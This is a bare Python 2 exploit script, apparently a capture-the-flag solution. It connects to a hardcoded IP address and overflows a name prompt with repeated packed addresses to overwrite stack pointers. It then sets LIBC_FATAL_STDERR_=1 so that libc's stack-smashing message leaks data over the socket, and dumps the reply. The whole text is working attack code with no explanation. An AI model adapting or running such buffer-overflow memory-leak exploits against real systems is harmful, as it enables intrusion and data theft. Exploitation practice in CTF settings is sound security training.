#!/usr/bin/env python2
import sys
import struct
from socket import *

ADDR = ('136.243.194.62', 1024)

def p64(n):
	return struct.pack('<Q', n)

if __name__ == '__main__':
	s = create_connection(ADDR)
	f = s.makefile(bufsize=0)
	print (f.readline())
	print (f.read(len("What's your name? ")))
	another_addr = 0x400d20
	f.write(p64(another_addr) * 70 + p64(0x600D20) * 70 + "\n")
	print (f.readline())
	print (f.read(len("Please overwrite the flag: ")))
	f.write("LIBC_FATAL_STDERR_=1")
	f.write("\n")
	print (f.readline())

	while True:
		c = f.read(1)
		if not c: break
		sys.stdout.write(c)
